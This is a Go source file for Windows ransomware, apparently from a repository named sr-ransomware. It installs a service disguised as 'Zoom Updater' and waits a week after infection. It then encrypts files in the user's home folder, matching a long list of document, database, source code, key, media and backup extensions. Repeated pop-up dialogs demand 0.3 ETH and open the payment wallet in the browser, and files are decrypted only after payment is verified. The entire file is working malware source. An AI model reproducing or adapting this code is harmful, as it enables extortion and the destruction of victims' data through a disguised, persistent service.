package main

import (
    "os"
    "time"
    "sync"
    "runtime"
    "path/filepath"

    "github.com/sug0/gowinsvc"
    "github.com/sug0/sr-ransomware/go/win"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
)

type service struct {
    ext  map[string]bool
    exec string
    date time.Time
}

const cryptoArg = "winmain"

var allExtensions map[string]bool

func main() {
    if len(os.Args) > 1 && os.Args[1] == cryptoArg {
        cryptoMain()
        return
    }
    serviceMain()
}

func cryptoMain() {
    // crypto dialog
    win.MessageBox(
        "Ooopsies!!!!!!!",
        "Looks like your files have been encrypted!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "Alright, so what?",
        "All your important work has been rendered useless.",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "Now what?!",
        "No worries, buddy! I can decrypt them, to return them to normal, for the bargain price of 0.3 ETH!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "What is ETH?",
        "Click OK to find out more.",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.ShellExecute("open", "https://www.myetherwallet.com/", "", win.SW_SHOW)

    wallet, err := victim.ImportEthereumWallet()
    if err != nil {
        win.MessageBox(
            "Sweet, okay, who do I need to pay?",
            "Unfortunately, you have been dumb enough to tamper with our files. Stay encrypted forever, now. :)",
            win.MB_OK | win.MB_ICONWARNING,
        )
        return
    }

    win.MessageBox(
        "Sweet, okay, who do I need to pay?",
        "Send 0.3 ETH to the address that will open in your browser!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.ShellExecute("open", "https://ethplorer.io/address/"+wallet, "", win.SW_SHOW)

    code, _ := win.MessageBox(
        "Pay status",
        "Have you paid already?",
        win.MB_YESNO | win.MB_ICONQUESTION,
    )

    switch code {
    case win.IDYES:
        aesIVKey, err := victim.VerifyPayment()
        if err != nil {
            win.MessageBox(
                "Damn",
                "Looks like you haven't paid yet, or we are having some issues. We'll be in touch in 5 minutes...",
                win.MB_OK | win.MB_ICONERROR,
            )
            return
        }
        win.MessageBox(
            "YAYYYYY",
            "We'll be decrypting your files now!!!!!!!!",
            win.MB_OK | win.MB_ICONEXCLAMATION,
        )
        decryptFiles(aesIVKey)
        victim.Desinfect()
        win.MessageBox(
            "WOOHOOOOOOO",
            "ALL DONE, HAVE A GOOD ONE MATE",
            win.MB_OK | win.MB_ICONEXCLAMATION,
        )
    case win.IDNO:
        win.MessageBox(
            "No worries mate!",
            "In 5 minutes, this dialog will pop up again. ;)",
            win.MB_OK | win.MB_ICONEXCLAMATION,
        )
    }
}

func serviceMain() {
    runtime.LockOSThread()
    manager := gowinsvc.NewService("Zoom Updater")
    s := service{
        exec: `"`+os.Args[0] + (`" ` + cryptoArg),
    }
    manager.StartServe(&s)
}

func (s *service) Serve(exit <-chan bool) {
    var err error
    s.date, err = victim.InfectionDate()
    if err != nil {
        // for some reason victim hasn't been infected,
        // or the infection files have been tampered with;
        // all in all, it's just best to exit
        return
    }
    s.date = s.date.Add(7 * 24 * time.Hour)

    if time.Now().Before(s.date) {
        s.beforeDeployment(exit)
    }
    s.afterDeployment(exit)
}

func (s *service) beforeDeployment(exit <-chan bool) {
    for {
        select {
        case <-exit:
            return
        case t := <-time.After(1 * time.Minute):
            if t.After(s.date) {
                s.afterDeployment(exit)
            }
        }
    }
}

func (s *service) afterDeployment(exit <-chan bool) {
    done := make(chan struct{})
    go encryptFiles(done)
    for {
        select {
        case <-exit:
            return
        case <-done:
            s.afterEncryption(exit)
        }
    }
}

func (s *service) afterEncryption(exit <-chan bool) {
    s.launchCrypto()
    for {
        select {
        case <-exit:
            return
        case <-time.After(5 * time.Minute):
            s.launchCrypto()
        }
    }
}

func (s *service) launchCrypto() {
    win.LaunchProcess(s.exec)
}

func encryptFiles(done chan<- struct{}) {
    defer close(done)
    pk, err := victim.ImportPublicKey()
    if err != nil {
        return
    }
    wg := sync.WaitGroup{}
    sem := make(chan struct{}, runtime.NumCPU())
    filepath.Walk(os.Getenv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
        wg.Add(1)
        go func() {
            sem <- struct{}{}
            defer func() {
                <-sem
                wg.Done()
            }()
            if ent.IsDir() || !validExtension(path) {
                return
            }
            victim.EncryptFile(pk, path)
        }()
        return nil
    })
    wg.Wait()
}

func decryptFiles(aesIVKey []byte) {
    sk, err := victim.ImportSecretKey(aesIVKey)
    if err != nil {
        return
    }
    wg := sync.WaitGroup{}
    sem := make(chan struct{}, runtime.NumCPU())
    filepath.Walk(os.Getenv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
        wg.Add(1)
        go func() {
            sem <- struct{}{}
            defer func() {
                <-sem
                wg.Done()
            }()
            if ent.IsDir() || filepath.Ext(path) != ".flu" {
                return
            }
            victim.DecryptFile(sk, path)
        }()
        return nil
    })
    wg.Wait()
}

func validExtension(path string) bool {
    initExtensions()
    return allExtensions[filepath.Ext(path)]
}

func initExtensions() {
    if allExtensions == nil {
        allExtensions = map[string]bool{
            ".der": true,
            ".pfx": true,
            ".key": true,
            ".crt": true,
            ".csr": true,
            ".p12": true,
            ".pem": true,
            ".odt": true,
            ".ott": true,
            ".sxw": true,
            ".stw": true,
            ".uot": true,
            ".3ds": true,
            ".max": true,
            ".3dm": true,
            ".ods": true,
            ".ots": true,
            ".sxc": true,
            ".stc": true,
            ".dif": true,
            ".slk": true,
            ".wb2": true,
            ".odp": true,
            ".otp": true,
            ".sxd": true,
            ".std": true,
            ".uop": true,
            ".odg": true,
            ".otg": true,
            ".sxm": true,
            ".mml": true,
            ".lay": true,
            ".lay6": true,
            ".asc": true,
            ".sqlite3": true,
            ".sqlitedb": true,
            ".sql": true,
            ".accdb": true,
            ".mdb": true,
            ".db": true,
            ".dbf": true,
            ".odb": true,
            ".frm": true,
            ".myd": true,
            ".myi": true,
            ".ibd": true,
            ".mdf": true,
            ".ldf": true,
            ".sln": true,
            ".suo": true,
            ".cs": true,
            ".c": true,
            ".cpp": true,
            ".pas": true,
            ".h": true,
            ".asm": true,
            ".js": true,
            ".cmd": true,
            ".bat": true,
            ".ps1": true,
            ".vbs": true,
            ".vb": true,
            ".pl": true,
            ".dip": true,
            ".dch": true,
            ".sch": true,
            ".brd": true,
            ".jsp": true,
            ".php": true,
            ".asp": true,
            ".rb": true,
            ".css": true,
            ".html": true,
            ".toml": true,
            ".json": true,
            ".go": true,
            ".rs": true,
            ".java": true,
            ".jar": true,
            ".class": true,
            ".sh": true,
            ".mp3": true,
            ".wav": true,
            ".flac": true,
            ".swf": true,
            ".fla": true,
            ".wmv": true,
            ".mpg": true,
            ".vob": true,
            ".mpeg": true,
            ".asf": true,
            ".avi": true,
            ".ogg": true,
            ".opus": true,
            ".mov": true,
            ".mp4": true,
            ".webm": true,
            ".3gp": true,
            ".mkv": true,
            ".3g2": true,
            ".flv": true,
            ".wma": true,
            ".mid": true,
            ".m3u": true,
            ".m4u": true,
            ".djvu": true,
            ".svg": true,
            ".ai": true,
            ".psd": true,
            ".nef": true,
            ".tiff": true,
            ".tif": true,
            ".cgm": true,
            ".raw": true,
            ".gif": true,
            ".png": true,
            ".bmp": true,
            ".jpg": true,
            ".jpeg": true,
            ".vcd": true,
            ".iso": true,
            ".backup": true,
            ".zip": true,
            ".rar": true,
            ".7z": true,
            ".gz": true,
            ".tgz": true,
            ".tar": true,
            ".bak": true,
            ".tbk": true,
            ".bz2": true,
            ".PAQ": true,
            ".ARC": true,
            ".aes": true,
            ".gpg": true,
            ".vmx": true,
            ".vmdk": true,
            ".vdi": true,
            ".sldm": true,
            ".sldx": true,
            ".sti": true,
            ".sxi": true,
            ".602": true,
            ".hwp": true,
            ".snt": true,
            ".onetoc2": true,
            ".dwg": true,
            ".pdf": true,
            ".wk1": true,
            ".wks": true,
            ".123": true,
            ".rtf": true,
            ".csv": true,
            ".txt": true,
            ".vsdx": true,
            ".vsd": true,
            ".edb": true,
            ".eml": true,
            ".msg": true,
            ".ost": true,
            ".pst": true,
            ".potm": true,
            ".potx": true,
            ".ppam": true,
            ".ppsx": true,
            ".ppsm": true,
            ".pps": true,
            ".pot": true,
            ".pptm": true,
            ".pptx": true,
            ".ppt": true,
            ".xltm": true,
            ".xltx": true,
            ".xlc": true,
            ".xlm": true,
            ".xlt": true,
            ".xlw": true,
            ".xlsb": true,
            ".xlsm": true,
            ".xlsx": true,
            ".xls": true,
            ".dotx": true,
            ".dotm": true,
            ".dot": true,
            ".docm": true,
            ".docb": true,
            ".docx": true,
            ".doc": true,
        }
    }
}
